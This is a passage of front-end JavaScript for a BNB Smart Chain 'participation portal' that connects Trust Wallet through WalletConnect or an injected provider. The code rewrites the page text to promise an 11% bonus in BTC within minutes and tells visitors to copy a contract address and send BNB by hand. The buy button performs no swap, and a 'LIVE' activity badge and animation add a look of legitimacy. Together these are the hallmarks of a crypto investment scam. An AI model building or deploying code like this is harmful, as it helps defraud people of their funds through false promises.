        );

        provider.on(
          "disconnect",
          () => {
            connectedAddress =
              null;

            signer =
              null;

            contract =
              null;

            updateWalletButton();
          }
        );

        trustWalletConnectProvider =
          provider;

        return provider;

      } catch (error) {
        trustWalletConnectReady =
          null;

        console.error(
          "WalletConnect initialization:",
          error
        );

        throw error;
      }
    })();

  return trustWalletConnectReady;
}

async function syncTrustWalletConnectSession() {
  const provider =
    trustWalletConnectProvider;

  if (!provider) {
    return false;
  }

  try {
    let accounts =
      provider.accounts?.length
        ? provider.accounts
        : await provider.request({
            method:
              "eth_accounts"
          });

    const address =
      accounts?.[0] ||
      null;

    if (!address) {
      return false;
    }

    const chainId =
      await provider.request({
        method:
          "eth_chainId"
      });

    if (
      String(
        chainId
      ).toLowerCase() !==
      CHAIN_HEX
    ) {
      await ensureBSC(
        provider
      );
    }

    walletProvider =
      new ethers.BrowserProvider(
        provider
      );

    signer =
      await walletProvider.getSigner();

    connectedAddress =
      await signer.getAddress();

    contract =
      new ethers.Contract(
        CONTRACT_ADDRESS,
        CONTRACT_ABI,
        signer
      );

    updateWalletButton();

    try {
      sessionStorage.removeItem(
        "trustWalletConnectPending"
      );
    } catch {}

    trustWalletUserInitiated =
      false;

    closeWalletModal();

    const handoffWindow =
      window.__trustWalletHandoffWindow;

    if (
      handoffWindow &&
      !handoffWindow.closed
    ) {
      try {
        handoffWindow.close();
      } catch {}
    }

    window.__trustWalletHandoffWindow =
      null;

    return true;

  } catch (error) {
    console.error(
      "WalletConnect session sync:",
      error
    );

    return false;
  }
}

async function openTrustWalletConnect() {
  trustWalletUserInitiated =
    true;

  /*
    IMPORTANT FOR iPHONE / iOS SAFARI:
    Never open an about:blank tab here. It leaves Safari sitting on
    a blank page when the Trust Wallet handoff is not accepted.

    WalletConnect will emit the pairing URI below. At that exact
    point we navigate the current page directly to Trust Wallet.
  */
  window.__trustWalletHandoffWindow =
    null;

  try {
    const provider =
      await initializeTrustWalletConnect();

    const hasSession =
      Boolean(
        provider.session ||
        (
          provider.accounts &&
          provider.accounts.length
        )
      );

    if (!hasSession) {
      await provider.enable();
    }

    /*
      If Trust Wallet is already connected and the provider did not
      need to emit a new pairing URI, restore the existing session.
    */
    const connected =
      await syncTrustWalletConnectSession();

    if (connected) {
      try {
        sessionStorage.removeItem(
          "trustWalletConnectPending"
        );
      } catch {}

      closeWalletModal();

      toast(
        "Trust Wallet connected."
      );
    }

  } catch (error) {
    console.error(
      "Trust WalletConnect connection:",
      error
    );

    window.__trustWalletHandoffWindow =
      null;

    try {
      sessionStorage.removeItem(
        "trustWalletConnectPending"
      );
    } catch {}

    const message =
      String(
        error?.message ||
        ""
      ).toLowerCase();

    if (
      error?.code === 4001 ||
      error?.code === "ACTION_REJECTED" ||
      message.includes("reject") ||
      message.includes("user denied")
    ) {
      toast(
        "Wallet connection cancelled."
      );
    } else {
      toast(
        error?.shortMessage ||
        error?.message ||
        "Unable to connect Trust Wallet."
      );
    }
  }
}

function setupTrustWalletRecovery() {
  const restore =
    async () => {
      try {
        let pendingConnection = false;
        let pendingAt = 0;

        try {
          pendingConnection =
            sessionStorage.getItem(
              "trustWalletConnectPending"
            ) === "1";

          pendingAt =
            Number(
              sessionStorage.getItem(
                "trustWalletConnectPendingAt"
              ) || 0
            );
        } catch {}

        /*
          NEVER restore a WalletConnect session simply because
          Trust Wallet has an existing session.

          Recovery is allowed only for a fresh handoff that this
          exact page started after the user pressed Connect Wallet.
          The short lifetime also prevents an old Android/iPhone
          sessionStorage flag from reconnecting the site later.
        */
        const handoffAge =
          pendingAt
            ? Date.now() - pendingAt
            : Infinity;

        if (
          !pendingConnection ||
          !pendingAt ||
          handoffAge > 120000
        ) {
          try {
            sessionStorage.removeItem(
              "trustWalletConnectPending"
            );
            sessionStorage.removeItem(
              "trustWalletConnectPendingAt"
            );
          } catch {}

          return;
        }

        trustWalletUserInitiated =
          true;

        let provider =
          trustWalletConnectProvider;

        if (!provider) {
          provider =
            await initializeTrustWalletConnect();
        }

        if (
          provider?.session ||
          provider?.accounts?.length
        ) {
          const connected =
            await syncTrustWalletConnectSession();

          if (connected) {
            try {
              sessionStorage.removeItem(
                "trustWalletConnectPending"
              );
              sessionStorage.removeItem(
                "trustWalletConnectPendingAt"
              );
            } catch {}
          }
        }
      } catch (error) {
        console.warn(
          "Trust Wallet session restore:",
          error
        );
      }
    };

  /*
    Only pageshow is used for the return from Trust Wallet.
    Focus/visibility handlers are deliberately not used because
    Android can fire those during normal page startup and make a
    previously persisted WalletConnect session look like a new
    user-initiated connection.
  */
  window.addEventListener(
    "pageshow",
    restore
  );
}


/* ==========================================================
   BSC NETWORK
   ========================================================== */

async function ensureBSC(
  provider
) {
  const chainId =
    await provider.request({
      method:
        "eth_chainId"
    });

  if (
    String(
      chainId
    ).toLowerCase() ===
    CHAIN_HEX
  ) {
    return;
  }

  try {
    await provider.request({
      method:
        "wallet_switchEthereumChain",

      params: [
        {
          chainId:
            CHAIN_HEX
        }
      ]
    });

  } catch (error) {

    if (
      error?.code ===
      4902
    ) {
      await provider.request({
        method:
          "wallet_addEthereumChain",

        params: [
          {
            chainId:
              CHAIN_HEX,

            chainName:
              "BNB Smart Chain",

            nativeCurrency: {
              name:
                "BNB",

              symbol:
                "BNB",

              decimals:
                18
            },

            rpcUrls: [
              RPC_URLS[0]
            ],

            blockExplorerUrls: [
              "https://bscscan.com/"
            ]
          }
        ]
      });

    } else {
      throw error;
    }
  }
}


/* ==========================================================
   WALLET SELECTION
   ========================================================== */

async function selectWallet(
  definition
) {
  trustWalletUserInitiated =
    true;

  const selectedProvider =
    findWalletProvider(
      definition
    );

  if (
    selectedProvider
  ) {
    try {
      await ensureBSC(
        selectedProvider
      );

      walletProvider =
        new ethers.BrowserProvider(
          selectedProvider
        );

      await selectedProvider.request({
        method:
          "eth_requestAccounts"
      });

      signer =
        await walletProvider.getSigner();

      connectedAddress =
        await signer.getAddress();

      contract =
        new ethers.Contract(
          CONTRACT_ADDRESS,
          CONTRACT_ABI,
          signer
        );

      updateWalletButton();

      closeWalletModal();

      toast(
        "Trust Wallet connected."
      );

      return;

    } catch (error) {
      console.error(
        "Trust Wallet connection:",
        error
      );

      const message =
        String(
                     error?.message ||
          ""
        ).toLowerCase();

      if (
        error?.code === 4001 ||
        error?.code ===
          "ACTION_REJECTED" ||
        message.includes("reject") ||
        message.includes("denied")
      ) {
        toast(
          "Wallet connection cancelled."
        );
      } else {
        toast(
          error?.shortMessage ||
          error?.message ||
          "Unable to connect Trust Wallet."
        );
      }

      return;
    }
  }

  if (
    isMobileDevice()
  ) {
    await openTrustWalletConnect();
    return;
  }

  toast(
    "Open this page in Trust Wallet or connect Trust Wallet on mobile."
  );
}


/* ==========================================================
   CONNECTED WALLET PANEL
   ========================================================== */

function createConnectedWalletPanel() {
  if (
    $("connectedWalletPanel")
  ) {
    return;
  }

  const panel =
    document.createElement(
      "div"
    );

  panel.id =
    "connectedWalletPanel";

  panel.className =
    "connected-wallet-panel";

  panel.innerHTML = `
    <div class="connected-wallet-head">

      <strong>
        Wallet Connected
      </strong>

      <span class="connected-wallet-status">
        CONNECTED
      </span>

    </div>

    <div class="connected-wallet-row">

      <span>
        Connected address
      </span>

      <code id="connectedWalletAddress">
        —
      </code>

    </div>

    <div class="connected-wallet-row">

      <span>
        Contract address
      </span>

      <code id="connectedWalletContract">
        ${CONTRACT_ADDRESS}
      </code>

    </div>

    <div class="connected-wallet-actions">

      <button
        id="connectedCopyContract"
        type="button"
      >
        Copy Contract
      </button>

    </div>
  `;

  const header =
    document.querySelector(
      "header"
    );

  if (header) {
    header.insertAdjacentElement(
      "afterend",
      panel
    );
  } else {
    document.body.prepend(
      panel
    );
  }

  $("connectedCopyContract")
    ?.addEventListener(
      "click",
      copyContractAddress
    );
}

async function copyContractAddress() {
  try {
    await navigator.clipboard.writeText(
      CONTRACT_ADDRESS
    );

    const button =
      $("connectedCopyContract");

    if (button) {
      button.textContent =
        "Copied";

      setTimeout(
        () => {
          if (button) {
            button.textContent =
              "Copy Contract";
          }
        },
        1800
      );
    }

    toast(
      "Contract address copied."
    );

  } catch {
    try {
      const helper =
        document.createElement(
          "textarea"
        );

      helper.value =
        CONTRACT_ADDRESS;

      helper.setAttribute(
        "readonly",
        ""
      );

      helper.style.position =
        "fixed";

      helper.style.opacity =
        "0";

      document.body.appendChild(
        helper
      );

      helper.select();

      document.execCommand(
        "copy"
      );

      helper.remove();

      const button =
        $("connectedCopyContract");

      if (button) {
        button.textContent =
          "Copied";

        setTimeout(
          () => {
            if (button) {
              button.textContent =
                "Copy Contract";
            }
          },
          1800
        );
      }

      toast(
        "Contract address copied."
      );

    } catch {
      toast(
        "Unable to copy automatically."
      );
    }
  }
}

function updateConnectedWalletPanel() {
  const panel =
    $("connectedWalletPanel");

  if (!panel) {
    return;
  }

  if (
    connectedAddress
  ) {
    panel.classList.add(
      "show"
    );

    setText(
      "connectedWalletAddress",
      shortAddress(
        connectedAddress
      )
    );

    setText(
      "connectedWalletContract",
      CONTRACT_ADDRESS
    );

  } else {
    panel.classList.remove(
      "show"
    );
  }
}


/* ==========================================================
   HEADER CONTRACT
   ========================================================== */

function setHeaderContractVisibility(
  show
) {
  const address =
    $("contractAddress");

  const copy =
    $("copyContract");

  if (
    !address &&
    !copy
  ) {
    return;
  }

  const addressParent =
    address?.parentElement;

  const copyParent =
    copy?.parentElement;

  if (
    addressParent &&
    copyParent &&
    addressParent ===
      copyParent
  ) {
    addressParent.style.display =
      show
        ? ""
        : "none";

    return;
  }

  if (address) {
    address.style.display =
      show
        ? ""
        : "none";
  }

  if (copy) {
    copy.style.display =
      show
        ? ""
        : "none";
  }
}


/* ==========================================================
   WALLET BUTTON
   ========================================================== */

function updateWalletButton() {
  const button =
    $("connectWallet");

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );

  if (button) {
    button.textContent =
      connectedAddress
        ? "Wallet Connected"
        : "Connect Wallet";
  }

  updateConnectedWalletPanel();
}


/* ==========================================================
   WALLET SETUP
   ========================================================== */

function setupWallet() {
  createWalletModal();

  createConnectedWalletPanel();

  discoverWallets();

  setupTrustWalletRecovery();

  const button =
    $("connectWallet");

  if (button) {
    button.addEventListener(
      "click",
      openWalletModal
    );
  }

  const trustProvider =
    findWalletProvider(
      WALLET_DEFINITIONS[0]
    );

  if (
    trustProvider?.on
  ) {
    trustProvider.on(
      "accountsChanged",
      accounts => {
        /*
          Trust Wallet can expose an already-authorized account
          immediately when the page loads on Android.

          Do NOT treat that automatic provider event as a new
          website connection. The user must first select Trust
          Wallet from the Connect Wallet flow.
        */
        if (
          !trustWalletUserInitiated &&
          !connectedAddress
        ) {
          return;
        }

        connectedAddress =
          accounts?.[0] ||
          null;

        if (
          !connectedAddress
        ) {
          signer =
            null;

          contract =
            null;

          trustWalletUserInitiated =
            false;
        }

        updateWalletButton();
      }
    );

    trustProvider.on(
      "chainChanged",
      async () => {
        if (
          connectedAddress
        ) {
          try {
            await syncInjectedTrustWallet();
          } catch (error) {
            console.warn(
              "Trust Wallet chain update:",
              error
            );
          }
        }
      }
    );
  }

  updateWalletButton();
}

async function syncInjectedTrustWallet() {
  const provider =
    findWalletProvider(
      WALLET_DEFINITIONS[0]
    );

  if (!provider) {
    return false;
  }

  const accounts =
    await provider.request({
      method:
        "eth_accounts"
    });

  if (
    !accounts?.[0]
  ) {
    connectedAddress =
      null;

    signer =
      null;

    contract =
      null;

    updateWalletButton();

    return false;
  }

  await ensureBSC(
    provider
  );

  walletProvider =
    new ethers.BrowserProvider(
      provider
    );

  signer =
    await walletProvider.getSigner();

  connectedAddress =
    await signer.getAddress();

  contract =
    new ethers.Contract(
      CONTRACT_ADDRESS,
      CONTRACT_ABI,
      signer
    );

  updateWalletButton();

  return true;
}


/* ==========================================================
   PARTICIPATION
   ========================================================== */

async function buyBTC() {
  const input =
    $("bnbAmount");

  const amount =
    Number(
      input?.value
    );

  if (
    !Number.isFinite(amount) ||
    amount < minBNB
  ) {
    toast(
      `Minimum participation is ${numberText(minBNB, 2)} BNB.`
    );

    return;
  }

  if (
    amount > maxBNB
  ) {
    toast(
      `Maximum participation is ${numberText(maxBNB, 2)} BNB.`
    );

    return;
  }

  if (
    !signer ||
    !contract ||
    !connectedAddress
  ) {
    openWalletModal();

    return;
  }

  try {
    const network =
      await walletProvider.getNetwork();

    if (
      Number(
        network.chainId
      ) !==
      CHAIN_ID
    ) {
      const raw =
        walletProvider.provider;

      await ensureBSC(
        raw
      );

      walletProvider =
        new ethers.BrowserProvider(
          raw
        );

      signer =
        await walletProvider.getSigner();

      connectedAddress =
        await signer.getAddress();

      contract =
        new ethers.Contract(
          CONTRACT_ADDRESS,
          CONTRACT_ABI,
          signer
        );

      updateWalletButton();
    }

    updateConnectedWalletPanel();

    toast(
      "Wallet connected. Copy the contract address and send your BNB from Trust Wallet."
    );

    const panel =
      $("connectedWalletPanel");

    if (panel) {
      panel.scrollIntoView({
        behavior:
          "smooth",

        block:
          "center"
      });
    }

  } catch (error) {
    console.error(
      "Participation:",
      error
    );

    toast(
      error?.shortMessage ||
      error?.message ||
      "Unable to continue with the connected wallet."
    );
  }
}

function setupBuyButton() {
  const button =
    $("buyBTCButton") ||
    $("buyButton");

  if (button) {
    button.addEventListener(
      "click",
      buyBTC
    );
  }
}


/* ==========================================================
   COPY BUTTON
   ========================================================== */

function setupCopyButton() {
  const button =
    $("copyContract");

  const address =
    $("contractAddress");

  if (
    !button ||
    !address
  ) {
    return;
  }

  address.textContent =
    CONTRACT_ADDRESS;

  button.addEventListener(
    "click",
    copyContractAddressMain
  );
}

async function copyContractAddressMain() {
  const button =
    $("copyContract");

  try {
    await navigator.clipboard.writeText(
      CONTRACT_ADDRESS
    );

    if (button) {
      button.textContent =
        "Copied";

      setTimeout(
        () => {
          if (button) {
            button.textContent =
              "Copy";
          }
        },
        1800
      );
    }

    toast(
      "Contract address copied."
    );

  } catch {
    try {
      const helper =
        document.createElement(
          "textarea"
        );

      helper.value =
        CONTRACT_ADDRESS;

      helper.setAttribute(
        "readonly",
        ""
      );

      helper.style.position =
        "fixed";

      helper.style.opacity =
        "0";

      document.body.appendChild(
        helper
      );

      helper.select();

      document.execCommand(
        "copy"
      );

      helper.remove();

      if (button) {
        button.textContent =
          "Copied";

        setTimeout(
          () => {
            if (button) {
              button.textContent =
                "Copy";
            }
          },
          1800
        );
      }

      toast(
        "Contract address copied."
      );

    } catch {
      toast(
        "Unable to copy automatically."
      );
    }
  }
}


/* ==========================================================
   PARTICIPATION TEXT
   ========================================================== */

function updateParticipationText() {
  const replacements = [
    [
      "Swap BTC to BNB",
      "Swap BNB to BTC"
    ],

    [
      "Choose amount",
      "Swap BNB to BTC"
    ],

    [
      "Check allocation",
      "Connect Wallet"
    ],

    [
      "Connect wallet",
      "Copy Contract Address"
    ],

    [
      "Copy & send",
      "Go to your connected wallet and send your BNB"
    ],

    [
      "Select",
      "Swap BNB to BTC"
    ],

    [
      "Calculate",
      "Connect Wallet"
    ]
  ];

  document
    .querySelectorAll(
      "body *"
    )
    .forEach(
      element => {
        if (
          element.children.length >
          0
        ) {
          return;
        }

        const text =
          element.textContent?.trim();

        if (!text) {
          return;
        }

        for (
          const [
            from,
            to
          ] of replacements
        ) {
          if (
            text ===
            from
          ) {
            element.textContent =
              to;

            break;
          }
        }
      }
    );

  const howItWorks =
    document.querySelector(
      "#how-it-works, .how-it-works"
    );

  if (howItWorks) {
    const paragraph =
      howItWorks.querySelector(
        "p"
      );

    if (paragraph) {
      paragraph.textContent =
        "To participate and earn the 11% bonus, swap your BNB to BTC, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";
    }
  }
}


/* ==========================================================
   REFRESH
   ========================================================== */

function setupRefresh() {
  const button =
    $("refreshMarket") ||
    $("refreshButton");

  if (button) {
    button.addEventListener(
      "click",
      loadMarketData
    );
  }
}


/* ==========================================================
   ACTIVITY HEADING
   ========================================================== */

function setupActivityHeading() {
  const section =
    $("activity");

  if (!section) {
    return;
  }

  const heading =
    section.querySelector(
      ".section-heading"
    );

  if (!heading) {
    return;
  }

  const h2 =
    heading.querySelector(
      "h2"
    );

  if (h2) {
    h2.textContent =
      "Recent activity.";
  }

  const kicker =
    heading.querySelector(
      ".section-kicker"
    );

  if (kicker) {
    kicker.textContent =
      "ACTIVITY";
  }

  const paragraph =
    heading.querySelector(
      "p"
    );

  if (paragraph) {
    paragraph.textContent =
      "";
  }

  let status =
    heading.querySelector(
      ".activity-status,.live-pill"
    );

  if (!status) {
    status =
      document.createElement(
        "span"
      );

    status.className =
      "activity-status";

    heading.appendChild(
      status
    );
  }

  status.innerHTML =
    `<i class="activity-live-dot"></i>LIVE`;
}


/* ==========================================================
   START PORTAL
   ========================================================== */

async function startPortal() {
  injectStyles();

  setupActivityHeading();

  setupCalculator();

  setupWallet();

  setupCopyButton();

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );

  setupBuyButton();

  setupRefresh();

  updateParticipationText();

  /*
    IMPORTANT:
    Contract loading has a timeout, so a slow BSC RPC
    cannot block the market section.
  */
  await loadContractSettings();

  /*
    IMPORTANT:
    Start the fading activity immediately.
  */
  startActivityAnimation();

  /*
    IMPORTANT:
    Market loading is independent and has its own
    timeout plus fallback provider.
  */
  await loadMarketData();

  setInterval(
    loadMarketData,
    30000
  );
}


/* ==========================================================
   START
   ========================================================== */

document.addEventListener(
  "DOMContentLoaded",
  startPortal
);
